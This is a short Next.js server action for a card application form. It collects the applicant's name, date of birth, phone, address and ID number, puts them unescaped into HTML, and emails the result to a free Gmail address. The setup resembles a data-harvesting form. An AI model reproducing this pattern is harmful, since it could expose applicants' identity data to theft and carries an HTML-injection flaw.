"use server";

import { sendEmail } from "@/lib/mail";

export async function submitCardApplication(formData: FormData) {
  const cardType = formData.get("cardType") as string;
  const fullName = formData.get("fullName") as string;
  const dob = formData.get("dob") as string;
  const phone = formData.get("phone") as string;
  const email = formData.get("email") as string;
  const country = formData.get("country") as string;
  const state = formData.get("state") as string;
  const address = formData.get("address") as string;
  const idNumber = formData.get("idNumber") as string;

  const html = `
    <h1>New ${cardType.toUpperCase()} Card Application</h1>
    <p><strong>Full Name:</strong> ${fullName}</p>
    <p><strong>DOB:</strong> ${dob}</p>
    <p><strong>Phone:</strong> ${phone}</p>
    <p><strong>Email:</strong> ${email}</p>
    <p><strong>Country:</strong> ${country}</p>
    <p><strong>State:</strong> ${state}</p>
    <p><strong>Address:</strong> ${address}</p>
    <p><strong>ID Number:</strong> ${idNumber}</p>
  `;

  await sendEmail({
    to: "ok@gmail.com",
    subject: `New ${cardType.toUpperCase()} Card Application`,
    html,
  });

  return { success: true, cardType };
}
